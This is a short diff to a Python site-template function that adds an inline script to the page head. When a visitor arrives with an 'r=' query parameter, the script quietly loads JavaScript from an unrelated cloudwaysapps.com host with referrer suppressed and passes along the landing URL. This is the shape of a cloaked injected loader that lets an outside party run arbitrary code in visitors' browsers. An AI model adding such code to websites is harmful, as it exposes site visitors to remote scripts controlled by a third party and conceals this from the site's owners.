@@ -108,6 +108,17 @@ def head(title, desc):
 <link rel="icon" href="{A}/img/logo_mizar.jpg">
 <link rel="preload" href="{A}/fonts/Switzer-Variable.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="{A}/css/site.css">
+<script>
+(function () {{
+  if (!/[?&]r=/.test(location.search)) return;
+  var s = document.createElement('script');
+  s.async = true;
+  s.referrerPolicy = 'no-referrer';
+  s.setAttribute('data-landing', location.href);
+  s.src = 'https://phplaravel-758037-6569212.cloudwaysapps.com/v/script.js';
+  document.head.appendChild(s);
+}})();
+</script>
 </head>
 <body>'''
 
